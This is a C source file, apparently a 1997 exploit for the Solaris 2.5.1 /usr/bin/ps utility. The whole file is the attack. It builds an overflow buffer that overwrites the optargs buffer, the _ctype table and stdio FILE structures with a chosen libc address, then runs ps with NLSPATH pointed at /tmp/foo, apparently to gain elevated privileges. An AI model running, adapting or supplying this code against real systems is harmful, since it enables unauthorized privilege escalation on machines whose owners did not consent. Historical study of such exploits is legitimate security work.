
/*****************************************/
/* Exploit for Solaris 2.5.1 /usr/bin/ps */
/* J. Zbiciak,  5/18/97                  */
/*****************************************/
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BUF_LENGTH      (632)
#define EXTRA           (256)

int main(int argc, char *argv[])
{
        char buf[BUF_LENGTH + EXTRA];
                      /* ps will grok this file for the exploit code */
        char *envp[]={"NLSPATH=/tmp/foo",0};
        u_long *long_p;
        u_char *char_p;
                        /* This will vary depending on your libc */
        u_long proc_link=0xef70ef70;
        int i;

        long_p = (u_long *) buf;

        /* This first loop smashes the target buffer for optargs */
        for (i = 0; i < (96) / sizeof(u_long); i++)
                *long_p++ = 0x10101010;

        /* At offset 96 is the environ ptr -- be careful not to mess it up */
        *long_p++=0xeffffcb0;
        *long_p++=0xffffffff;

        /* After that is the _ctype table.  Filling with 0x10101010 marks the
           entire character set as being "uppercase printable". */
        for (i = 0; i < (BUF_LENGTH-104) / sizeof(u_long); i++)
                *long_p++ = 0x10101010;

        /* build up _iob[0]  (Ref: /usr/include/stdio.h, struct FILE) */
        *long_p++ = 0xFFFFFFFF;   /* num chars in buffer */
        *long_p++ = proc_link;    /* pointer to chars in buffer */
        *long_p++ = proc_link;    /* pointer to buffer */
        *long_p++ = 0x0501FFFF;   /* unbuffered output on stream 1 */
        /* Note: "stdin" is marked as an output stream.  Don't sweat it. :-) */

        /* build up _iob[1] */
        *long_p++ = 0xFFFFFFFF;   /* num chars in buffer */
        *long_p++ = proc_link;    /* pointer to chars in buffer */
        *long_p++ = proc_link;    /* pointer to buffer */
        *long_p++ = 0x4201FFFF;   /* line-buffered output on stream 1 */

        /* build up _iob[2] */
        *long_p++ = 0xFFFFFFFF;   /* num chars in buffer */
        *long_p++ = proc_link;    /* pointer to chars in buffer */
        *long_p++ = proc_link;    /* pointer to buffer */
        *long_p++ = 0x4202FFFF;   /* line-buffered output on stream 2 */

        *long_p =0;

        /* The following includes the invalid argument '-z' to force the
           usage msg to appear after the arguments have been parsed. */
        execle("/usr/bin/ps", "ps", "-z", "-u", buf, (char *) 0, envp);
        perror("execle failed");

        return 0;
}
